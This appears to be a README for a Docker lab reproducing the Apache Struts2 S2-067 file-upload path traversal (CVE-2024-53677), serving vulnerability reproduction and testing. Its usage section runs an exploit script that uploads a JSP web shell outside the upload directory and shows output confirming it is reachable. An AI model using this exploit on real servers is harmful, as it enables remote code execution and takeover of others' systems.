# Struts2 S2-067 Remote Code Execution (CVE-2024-53677)


An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.

Note: applications not using FileUploadInterceptor are safe.


```SHELL

docker-compose up -d

docker compose up -d

```


## Usage


### Step-1. Open Url and upload a `test.jpg`

```SHELL

http://a.b.c.d:8080

```


### Step-2. Use `S2-067.py` to Upload `shell.jsp`


```SHELL

root@docker:~/vulhub/struts2/s2-067>python S2-067.py -u http://a.b.c.d:8080/ --upload_endpoint /upload.action --files shell.jsp --destination ../shell.jsp
[INFO] Uploading files to http://a.b.c.d:8080/upload.action...
[SUCCESS] File shell.jsp uploaded successfully: ../shell.jsp
[INFO] Verifying uploaded file: http://a.b.c.d:8080/shell.jsp
[ALERT] File uploaded and accessible: http://a.b.c.d:8080/shell.jsp

```